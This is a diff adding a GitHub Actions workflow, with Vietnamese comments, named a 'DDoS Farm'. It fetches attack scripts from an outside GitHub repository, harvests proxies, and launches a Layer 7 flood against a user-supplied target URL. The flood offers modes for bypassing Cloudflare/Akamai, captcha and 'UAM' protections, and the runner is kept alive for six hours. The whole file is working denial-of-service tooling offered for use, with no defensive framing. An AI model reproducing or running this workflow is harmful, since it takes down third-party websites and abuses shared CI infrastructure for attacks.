@@ -1,0 +1,74 @@
+name: DDoS Farm Layer7 + Auto Fresh Proxy
+
+on:
+  workflow_dispatch:
+    inputs:
+      method:
+        description: 'Method (1=Flood, 2=CF-Akamai, 3=Captcha, 4=Uam)'
+        required: true
+        default: '2'
+        type: choice
+        options: ['1','2','3','4']
+      target:
+        description: 'Target URL'
+        required: true
+      time:
+        description: 'Time (seconds)'
+        required: true
+        default: '1800'
+      threads:
+        description: 'Threads'
+        required: true
+        default: '128'
+      rate:
+        description: 'Rate'
+        required: true
+        default: '256'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      # 1. Cài Node.js + Python
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      # 2. Download toàn bộ tool
+      - name: Download DDoS tools
+        run: |
+          wget -q https://github.com/112jb/mlonghehe/blob/main/cf.js
+          wget -q https://github.com/112jb/mlonghehe/blob/main/proxy.js
+          wget -q https://github.com/112jb/mlonghehe/blob/main/proxy.txt
+          wget -q https://github.com/112jb/mlonghehe/blob/main/run.py
+          chmod +x *
+
+      # 3. TỰ ĐỘNG LẤY PROXY TƯƠI (hơn 10 nguồn free + premium 2025)
+      - name: Get Fresh Proxy + Checker
+        run: |
+          echo "Đang lấy proxy tươi cực mạnh..."
+          node proxy.js > proxy.txt
+          echo "Đã lấy $(wc -l < proxy.txt) proxy sống!"
+          sleep 5
+
+      # 4. Bắn Layer7 với proxy tươi vừa lấy
+      - name: Start Layer7 Attack
+        run: |
+          nohup python3 run.py << EOF
+          2
+          1
+          ${{ inputs.method }}
+          ${{ inputs.target }}
+          ${{ inputs.time }}
+          ${{ inputs.threads }}
+          ${{ inputs.rate }}
+          proxy.txt
+          EOF
+
+      # 5. Giữ máy sống 6 tiếng
+      - name: Keep alive
+        run: sleep 21600
